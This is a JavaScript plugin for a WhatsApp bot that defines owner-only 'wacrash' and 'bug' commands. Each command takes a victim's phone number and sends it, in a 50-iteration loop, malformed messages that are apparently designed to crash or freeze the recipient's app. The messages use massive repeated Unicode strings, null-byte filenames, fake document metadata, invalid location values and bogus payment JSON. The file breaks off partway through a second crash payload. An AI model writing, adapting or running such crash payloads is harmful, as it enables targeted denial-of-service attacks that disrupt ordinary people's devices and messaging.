// Update සූන්


const { cmd, commands } = require('../lib/command');
const scraper = require("../lib/scraperd");
const axios = require('axios');
const fetch = require('node-fetch');
const { fetchJson, getBuffer } = require('../lib/functions');
const { lookup } = require('mime-types');
const fs = require('fs');
const path = require('path');
const yts = require('yt-search'); // For YouTube search
const cheerio = require('cheerio'); // Import cheerio for HTML parsing


const config = require('../settings')


const xml2js = require('xml2js');


const { updateEnv, readEnv } = require('../lib/database');


const os = require("os")


const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, jsonformat} = require('../lib/functions')

const bugres = '𝙋𝙧𝙤𝙘𝙘𝙚𝙨 👾'

const {
    default: makeWASocket,
    generateWAMessageFromContent,
    proto
} = require('@whiskeysockets/baileys')






cmd({
    pattern: "wacrash",
    react: "🔖",
    desc: "To take owner number",
    category: "bug",
    use: '.bug 947xxxxx',
    filename: __filename
},    
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

if (!isMe) return reply('_</> owner only..._')   

const vF6 = p94 => {
      conn.sendMessage(m.chat, {
        text: p94,
        contextInfo: {
          mentionedJid: [v26],
          forwardingScore: 9999999,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
            body: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
            previewType: "PHOTO",
            thumbnailUrl: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg",
            thumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg",
            sourceUrl: "https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z"
          }
        }
      }, {
        quoted: m
      });
    };

const v26 = m.key.fromMe ? conn.user.id.split(":")[0] + "@s.whatsapp.net" || conn : m.key.participant || m.key.remoteJid;
    var v16 = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "";
  const v18 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v16) ? v16.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
    const v20 = v16.replace(v18, "").trim().split(/ +/).shift().toLowerCase();

        if (!q) {
          return vF6("`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞` \n*𝘊𝘰𝘯𝘵𝘰𝘩 " + (v18 + v20) + " 6289526156543*");
        }
const msg = `\`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\` \n*ᥕᥲі𝗍 𝖿᥆r 𝗍һᥱ ᑲ᥆𝗍 𝗍᥆ rᥱᥲᥴᥱ 𝗍᥆ 𝗍һᥱ ᥱm᥆ȷі 🎀*`




   const v96 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };


   const v100 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const v103 = {
      key: v100,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };


    const v105 = {
      participant: "0@s.whatsapp.net",
      ...(m.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
const v108 = {
      key: v105,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };



/*
    async function f7(p47, p48, p49, p50 = false, p51 = true) {
      var vGenerateWAMessageFromContent7 = generateWAMessageFromContent(p47, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
                },
                hasMediaAttachment: true
              },
              body: {
                text: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞ꦾ" + "ꦾ".repeat(77777)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}"
              }
            }
          }
        }
      }), {
        userJid: p47,
        quoted: p48
      });
      await conn.relayMessage(p47, vGenerateWAMessageFromContent7.message, p51 ? {
        participant: {
          jid: p47
        }
      } : {});
      console.log(chalk.green("wait bwang..."));
    }
*/


async function f6(p44, p45, p46 = true) {
      const v88 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 1316134911,
        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
        fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1726867151",
        contactVcard: true,
        jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
      };
      const v89 = {
        documentMessage: v88,
        hasMediaAttachment: true
      };
      await conn.relayMessage(p44, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: v89,
              body: {
                text: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6289526156543".repeat(27000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6289526156543@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, p46 ? {
        participant: {
          jid: p44
        }
      } : {});
   //   console.log(chalk.green("wait bwang..."));
    }




    async function f21(p72, p73, p74 = false, p75 = false) {
      const v168 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 9007199254740991,
        mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
        fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
        fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1723855952",
        contactVcard: true,
        thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
        thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
        thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
        jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
      };
      const v169 = {
        title: "",
        documentMessage: v168,
        hasMediaAttachment: true
      };
/*    let vGenerateWAMessageFromContent14 = generateWAMessageFromContent(p72, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v169,
              body: {
                text: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [p74 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"💐༑⌁⃰↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"💐༑⌁⃰↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞〽️\",\"sections\":[{\"title\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p72,
        quoted: v93
      });
      await conn.relayMessage(p72, vGenerateWAMessageFromContent14.message, p75 ? {
        participant: {
          jid: p72
        }
      } : {});
    //  console.log(chalk.green("wait bwang..."));*/
    }



async function LocaBugs(target) {
 await conn.relayMessage(target, {
       groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}




async function DocBug(target) {
      let virtex = "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭";
        conn.relayMessage(target, {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };




async function NotifKill(target) {
      conn.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }




async function LocSystem(target) {
            let virtex = "⿻ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲 💞 ⿻";
            let memekz = Date.now();

            await conn.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "" + "ꦾ".repeat(50000) + "@X".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "AngeLs`" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
        };


async function f10(p54, p55) {
      var vGenerateWAMessageFromContent10 = generateWAMessageFromContent(p54, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "*`𝐀𝐬𝐬𝐚𝐥𝐚𝐦𝐮𝐚𝐥𝐚𝐢𝐤𝐮𝐦 𝐦𝐚𝐬`*𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p54,
        quoted: p55
      });
      await conn.relayMessage(p54, vGenerateWAMessageFromContent10.message, {
        participant: {
          jid: p54
        },
        messageId: vGenerateWAMessageFromContent10.key.id
      });
    }



async function f4(p40, p41) {
      var vGenerateWAMessageFromContent5 = generateWAMessageFromContent(p40, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "\0".repeat(900000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: p40,
        quoted: p41
      });
      await conn.relayMessage(p40, vGenerateWAMessageFromContent5.message, {
        participant: {
          jid: p40
        },
        messageId: vGenerateWAMessageFromContent5.key.id
      });
    }


    async function f5(p42, p43) {
      var vGenerateWAMessageFromContent6 = generateWAMessageFromContent(p42, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: p42,
        quoted: p43
      });
      await conn.relayMessage(p42, vGenerateWAMessageFromContent6.message, {
        participant: {
          jid: p42
        },
        messageId: vGenerateWAMessageFromContent6.key.id
      });
    }


        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(msg);
        for (let v244 = 0; v244 < 50; v244++) {
          //await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
         // await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await LocaBugs(target);
          await DocBug(target);
          await NotifKill(target);
          await LocSystem(target);
          //await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          //await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await LocaBugs(target);
          await DocBug(target);
          await NotifKill(target);
          await LocSystem(target);
                  }
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
})



cmd({
    pattern: "bug",
    react: "🔖",
    desc: "To take owner number",
    category: "bug",
    use: '.bug 947xxxxx',
    filename: __filename
},    
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

 if (!isMe) return reply('_</> owner only..._')   
 if(from.includes('94719199757') || from.includes('94703475691') || from.includes('94711453361')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!\n මෝඩ පොන්නය මට ගහන්න ඉයා කක්ක දාලා වරෙන්')
if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')        
if (!q) return reply(`Example: ${prefix + command} 62×××`)

async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await conn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}

                async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await conn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}


  const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
